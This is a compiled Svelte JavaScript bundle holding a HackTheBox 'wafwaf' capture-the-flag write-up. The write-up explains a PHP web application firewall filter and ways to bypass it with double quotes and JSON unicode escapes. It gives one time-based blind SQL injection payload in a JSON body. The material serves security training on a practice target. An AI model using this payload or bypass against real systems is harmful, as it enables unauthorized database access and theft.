#89DDFF">)</span></div></code></div></pre>`,js,D,qs,za,Ga,Ms,N,Xa,Bs,W,Za,Hs,U,Ja,Ns,Qa,Va,Ws,K,zs;return m=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img1.png"}}),q=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img2.png"}}),M=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img3.png"}}),B=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img4.png"}}),H=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img5.png"}}),N=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img6.png"}}),W=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img7.png"}}),U=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img8.png"}}),K=new T({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img9.png"}}),{c(){c=l("ul"),f=l("li"),L=F("Let’s start with the challenge. It’s a medium category challenge"),O=i(),E=l("li"),g=F(`If we navigate to the given ip address we get this source code
`),_(m.$$.fragment),Us=i(),ss=new Xl(!1),as=i(),t=l("ul"),ls=l("li"),I=l("p"),Zs=F("Starting from the top the function "),ns=l("code"),Js=F("error_reporting(0);"),Qs=F(" is used to remove all errors, warnings, parse messages, and notices, the parameter that should be passed to the error_reporting function "),os=l("strong"),Vs=F("is zero"),Ys=F("."),sa=i(),es=l("li"),v=l("p"),aa=F("Then we have a "),Fs=l("code"),la=F("db"),na=F(" class which inheriting from the "),ps=l("code"),oa=F("Connection"),ea=F(" class. Inside this class we have a method(function) called "),ts=l("code"),Fa=F("waf"),pa=F(" which is basically filtering out our inputs and working as some kind of firewall hence the name waf:"),rs=l("code"),ta=F("web application firewall"),ra=F("."),ca=i(),cs=l("li"),R=l("p"),ia=F("Then the "),is=l("code"),ya=F("preg_match_all()"),Ea=F(" function returns the number of matches of a pattern that were found in a string and populates a variable with the matches that were found."),Da=i(),ys=l("li"),k=l("p"),da=F("The "),Es=l("code"),va=F("implode()"),fa=F(" is a builtin function in PHP and is used to join the elements of an array. implode() is an alias for "),x=l("a"),ha=F("PHP | join() function"),ga=F(" and works exactly same as that of join() function."),ma=i(),Ds=l("li"),j=l("p"),ua=F("And the "),ds=l("code"),_a=F("preg_quote()"),Aa=F(" function adds a backslash to characters that have a special meaning in regular expressions so that searches for the literal characters can be done. This function is useful when using user input in regular expressions."),wa=i(),vs=l("li"),fs=l("p"),Ca=F("So if we insert any kind of input which contains the black listed commands the query will simply die dumping the matches & will not return anything."),ba=i(),hs=l("li"),gs=l("p"),$a=F("Playing with the input field & I got these"),La=i(),ms=l("li"),us=l("p"),_(q.$$.fragment),Ia=i(),_s=l("li"),As=l("p"),_(M.$$.fragment),ka=i(),ws=l("li"),Cs=l("p"),_(B.$$.fragment),Sa=i(),bs=l("li"),$s=l("p"),_(H.$$.fragment),Ta=i(),Ls=l("li"),S=l("p"),xa=F("So "),Is=l("code"),Pa=F("'"),Oa=F(" is getting filtered but we can use "),ks=l("code"),Ra=F('"'),ja=F(" and also case-insensitive."),qa=i(),Ss=l("li"),X=l("p"),Ma=F("After some more research I found this article which states we can bypass WAFs by sending uincode escaped characters  sending them as JSON objects. "),P=l("a"),Ba=F("https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/"),Ha=i(),Ts=l("li"),Z=l("p"),Na=F("Some hard word trail & error i finally created a payload which actually works "),xs=l("code"),Wa=F(`{"user":"d' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))NtXP)-- wxyg"}`),Ua=i(),Ps=l("li"),Os=l("p"),Ka=F("Building on this I created a script for this"),Ks=i(),Rs=new Xl(!1),js=i(),D=l("ul"),qs=l("li"),za=F("We got the info. about the database, table and column"),Ga=i(),Ms=l("li"),_(N.$$.fragment),Xa=i(),Bs=l("li"),_(W.$$.fragment),Za=i(),Hs=l("li"),_(U.$$.fragment),Ja=i(),Ns=l("li"),Qa=F("We got the flag"),Va=i(),Ws=l("li"),_(K.$$.fragment),this.h()},l(e){c=n(e,"UL",{});var d=o(c);f=n(d,"LI",{});var nl=o(f);L=p(nl,"Let’s start with the challenge. It’s a medium category challenge"),nl.forEach(a),O=y(d),E=n(d,"LI",{});var Ya=o(E);g=p(Ya,`If we navigate to the given ip address we get this source code
`),A(m.$$.fragment,Ya),Ya.forEach(a),d.forEach(a),Us=y(e),ss=Zl(e,!1),as=y(e),t=n(e,"UL",{});var r=o(t);ls=n(r,"LI",{});var ol=o(ls);I=n(ol,"P",{});var J=o(I);Zs=p(J,"Starting from the top the function "),ns=n(J,"CODE",{});var el=o(ns);Js=p(el,"error_reporting(0);"),el.forEach(a),Qs=p(J," is used to remove all errors, warnings, parse messages, and notices, the parameter that should be passed to the error_reporting function "),os=n(J,"STRONG",{});var Fl=o(os);Vs=p(Fl,"is zero"),Fl.forEach(a),Ys=p(J,"."),J.forEach(a),ol.forEach(a),sa=y(r),es=n(r,"LI",{});var pl=o(es);v=n(pl,"P",{});var u=o(v);aa=p(u,"Then we have a "),Fs=n(u,"CODE",{});var tl=o(Fs);la=p(tl,"db"),tl.forEach(a),na=p(u," class which inheriting from the "),ps=n(u,"CODE",{});var rl=o(ps);oa=p(rl,"Connection"),rl.forEach(a),ea=p(u," class. Inside this class we have a method(function) called "),ts=n(u,"CODE",{});var cl=o(ts);Fa=p(cl,"waf"),cl.forEach(a),pa=p(u," which is basically filtering out our inputs and working as some kind of firewall hence the name waf:"),rs=n(u,"CODE",{});var il=o(rs);ta=p(il,"web application firewall"),il.forEach(a),ra=p(u,"."),u.forEach(a),pl.forEach(a),ca=y(r),cs=n(r,"LI",{});var yl=o(cs);R=n(yl,"P",{});var Gs=o(R);ia=p(Gs,"Then the "),is=n(Gs,"CODE",{});var El=o(is);ya=p(El,"preg_match_all()"),El.forEach(a),Ea=p(Gs," function returns the number of matches of a pattern that were found in a string and populates a variable with the matches that were found."),Gs.forEach(a),yl.forEach(a),Da=y(r),ys=n(r,"LI",{});var Dl=o(ys);k=n(Dl,"P",{});var Q=o(k);da=p(Q,"The "),Es=n(Q,"CODE",{});var dl=o(Es);va=p(dl,"implode()"),dl.forEach(a),fa=p(Q," is a builtin function in PHP and is used to join the elements of an array. implode() is an alias for "),x=n(Q,"A",{href:!0,rel:!0,target:!0});var vl=o(x);ha=p(vl,"PHP | join() function"),vl.forEach(a),ga=p(Q," and works exactly same as that of join() function."),Q.forEach(a),Dl.forEach(a),ma=y(r),Ds=n(r,"LI",{});var fl=o(Ds);j=n(fl,"P",{});var Xs=o(j);ua=p(Xs,"And the "),ds=n(Xs,"CODE",{});var hl=o(ds);_a=p(hl,"preg_quote()"),hl.forEach(a),Aa=p(Xs," function adds a backslash to characters that have a special meaning in regular expressions so that searches for the literal characters can be done. This function is useful when using user input in regular expressions."),Xs.forEach(a),fl.forEach(a),wa=y(r),vs=n(r,"LI",{});var gl=o(vs);fs=n(gl,"P",{});var ml=o(fs);Ca=p(ml,"So if we insert any kind of input which contains the black listed commands the query will simply die dumping the matches & will not return anything."),ml.forEach(a),gl.forEach(a),ba=y(r),hs=n(r,"LI",{});var ul=o(hs);gs=n(ul,"P",{});var _l=o(gs);$a=p(_l,"Playing with the input field & I got these"),_l.forEach(a),ul.forEach(a),La=y(r),ms=n(r,"LI",{});var Al=o(ms);us=n(Al,"P",{});var wl=o(us);A(q.$$.fragment,wl),wl.forEach(a),Al.forEach(a),Ia=y(r),_s=n(r,"LI",{});var Cl=o(_s);As=n(Cl,"P",{});var bl=o(As);A(M.$$.fragment,bl),bl.forEach(a),Cl.forEach(a),ka=y(r),ws=n(r,"LI",{});var $l=o(ws);Cs=n($l,"P",{});var Ll=o(Cs);A(B.$$.fragment,Ll),Ll.forEach(a),$l.forEach(a),Sa=y(r),bs=n(r,"LI",{});var Il=o(bs);$s=n(Il,"P",{});var kl=o($s);A(H.$$.fragment,kl),kl.forEach(a),Il.forEach(a),Ta=y(r),Ls=n(r,"LI",{});var Sl=o(Ls);S=n(Sl,"P",{});var V=o(S);xa=p(V,"So "),Is=n(V,"CODE",{});var Tl=o(Is);Pa=p(Tl,"'"),Tl.forEach(a),Oa=p(V," is getting filtered but we can use "),ks=n(V,"CODE",{});var xl=o(ks);Ra=p(xl,'"'),xl.forEach(a),ja=p(V," and also case-insensitive."),V.forEach(a),Sl.forEach(a),qa=y(r),Ss=n(r,"LI",{});var Pl=o(Ss);X=n(Pl,"P",{});var sl=o(X);Ma=p(sl,"After some more research I found this article which states we can bypass WAFs by sending uincode escaped characters  sending them as JSON objects. "),P=n(sl,"A",{href:!0,rel:!0,target:!0});var Ol=o(P);Ba=p(Ol,"https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/"),Ol.forEach(a),sl.forEach(a),Pl.forEach(a),Ha=y(r),Ts=n(r,"LI",{});var Rl=o(Ts);Z=n(Rl,"P",{});var al=o(Z);Na=p(al,"Some hard word trail & error i finally created a payload which actually works "),xs=n(al,"CODE",{});var jl=o(xs);Wa=p(jl,`{"user":"d' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))NtXP)-- wxyg"}`),jl.forEach(a),al.forEach(a),Rl.forEach(a),Ua=y(r),Ps=n(r,"LI",{});var ql=o(Ps);Os=n(ql,"P",{});var Ml=o(Os);Ka=p(Ml,"Building on this I created a script for this"),Ml.forEach(a),ql.forEach(a),r.forEach(a),Ks=y(e),Rs=Zl(e,!1),js=y(e),D=n(e,"UL",{});var h=o(D);qs=n(h,"LI",{});var Bl=o(qs);za=p(Bl,"We got the info. about the database, table and column"),Bl.forEach(a),Ga=y(h),Ms=n(h,"LI",{});var Hl=o(Ms);A(N.$$.fragment,Hl),Hl.forEach(a),Xa=y(h),Bs=n(h,"LI",{});var Nl=o(Bs);A(W.$$.fragment,Nl),Nl.forEach(a),Za=y(h),Hs=n(h,"LI",{});var Wl=o(Hs);A(U.$$.fragment,Wl),Wl.forEach(a),Ja=y(h),Ns=n(h,"LI",{});var Ul=o(Ns);Qa=p(Ul,"We got the flag"),Ul.forEach(a),Va=y(h),Ws=n(h,"LI",{});var Kl=o(Ws);A(K.$$.fragment,Kl),Kl.forEach(a),h.forEach(a),this.h()},h(){ss.a=as,Y(x,"href","https://www.geeksforgeeks.org/php-join-function/"),Y(x,"rel","nofollow noopener noreferrer external"),Y(x,"target","_blank"),Y(P,"href","https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/"),Y(P,"rel","nofollow noopener noreferrer external"),Y(P,"target","_blank"),Rs.a=js},m(e,d){z(e,c,d),s(c,f),s(f,L),s(c,O),s(c,E),s(E,g),w(m,E,null),z(e,Us,d),ss.m(Ql,e,d),z(e,as,d),z(e,t,d),s(t,ls),s(ls,I),s(I,Zs),s(I,ns),s(ns,Js),s(I,Qs),s(I,os),s(os,Vs),s(I,Ys),s(t,sa),s(t,es),s(es,v),s(v,aa),s(v,Fs),s(Fs,la),s(v,na),s(v,ps),s(ps,oa),s(v,ea),s(v,ts),s(ts,Fa),s(v,pa),s(v,rs),s(rs,ta),s(v,ra),s(t,ca),s(t,cs),s(cs,R),s(R,ia),s(R,is),s(is,ya),s(R,Ea),s(t,Da),s(t,ys),s(ys,k),s(k,da),s(k,Es),s(Es,va),s(k,fa),s(k,x),s(x,ha),s(k,ga),s(t,ma),s(t,Ds),s(Ds,j),s(j,ua),s(j,ds),s(ds,_a),s(j,Aa),s(t,wa),s(t,vs),s(vs,fs),s(fs,Ca),s(t,ba),s(t,hs),s(hs,gs),s(gs,$a),s(t,La),s(t,ms),s(ms,us),w(q,us,null),s(t,Ia),s(t,_s),s(_s,As),w(M,As,null),s(t,ka),s(t,ws),s(ws,Cs),w(B,Cs,null),s(t,Sa),s(t,bs),s(bs,$s),w(H,$s,null),s(t,Ta),s(t,Ls),s(Ls,S),s(S,xa),s(S,Is),s(Is,Pa),s(S,Oa),s(S,ks),s(ks,Ra),s(S,ja),s(t,qa),s(t,Ss),s(Ss,X),s(X,Ma),s(X,P),s(P,Ba),s(t,Ha),s(t,Ts),s(Ts,Z),s(Z,Na),s(Z,xs),s(xs,Wa),s(t,Ua),s(t,Ps),s(Ps,Os),s(Os,Ka),z(e,Ks,d),Rs.m(Vl,e,d),z(e,js,d),z(e,D,d),s(D,qs),s(qs,za),s(D,Ga),s(D,Ms),w(N,Ms,null),s(D,Xa),s(D,Bs),w(W,Bs,null),s(D,Za),s(D,Hs),w(U,Hs,null),s(D,Ja),s(D,Ns),s(Ns,Qa),s(D,Va),s(D,Ws),w(K,Ws,null),zs=!0},p:nn,i(e){zs||(C(m.$$.fragment,e),C(q.$$.fragment,e),C(M.$$.fragment,e),C(B.$$.fragment,e),C(H.$$.fragment,e),C(N.$$.fragment,e),C(W.$$.fragment,e),C(U.$$.fragment,e),C(K.$$.fragment,e),zs=!0)},o(e){b(m.$$.fragment,e),b(q.$$.fragment,e),b(M.$$.fragment,e),b(B.$$.fragment,e),b(H.$$.fragment,e),b(N.$$.fragment,e),b(W.$$.fragment,e),b(U.$$.fragment,e),b(K.$$.fragment,e),zs=!1},d(e){e&&a(c),$(m),e&&a(Us),e&&ss.d(),e&&a(as),e&&a(t),$(q),$(M),$(B),$(H),e&&a(Ks),e&&Rs.d(),e&&a(js),e&&a(D),$(N),$(W),$(U),$(K)}}}function Fn(G){let c,f;const L=[G[0],Jl];let O={$$slots:{default:[en]},$$scope:{ctx:G}};for(let E=0;E<L.length;E+=1)O=ll(O,L[E]);return c=new on({props:O}),{c(){_(c.$$.fragment)},l(E){A(c.$$.fragment,E)},m(E,g){w(c,E,g),f=!0},p(E,[g]){const m=g&1?ln(L,[g&1&&zl(E[0]),g&0&&zl(Jl)]):{};g&2&&(m.$$scope={dirty:g,ctx:E}),c.$set(m)},i(E){f||(C(c.$$.fragment,E),f=!0)},o(E){b(c.$$.fragment,E),f=!1},d(E){$(c,E)}}}const Jl={title:"HackTheBox Challenge - Web - wafwaf",image:"/assets/wafwaf.png",created:"2021-08-21T00:00:00.000Z",tags:["ctf","sqli","htb","web"],flags:[],updated:"2023-01-13T20:04:36.627Z",slug:"/HackTheBox/wafwaf/+page.svelte.md",path:"/HackTheBox/wafwaf",toc:!1};function pn(G,c,f){return G.$$set=L=>{f(0,c=ll(ll({},c),Gl(L)))},c=Gl(c),[c]}class yn extends Yl{constructor(c){super(),sn(this,c,pn,Fn,an,{})}}export{yn as default,Jl as metadata};
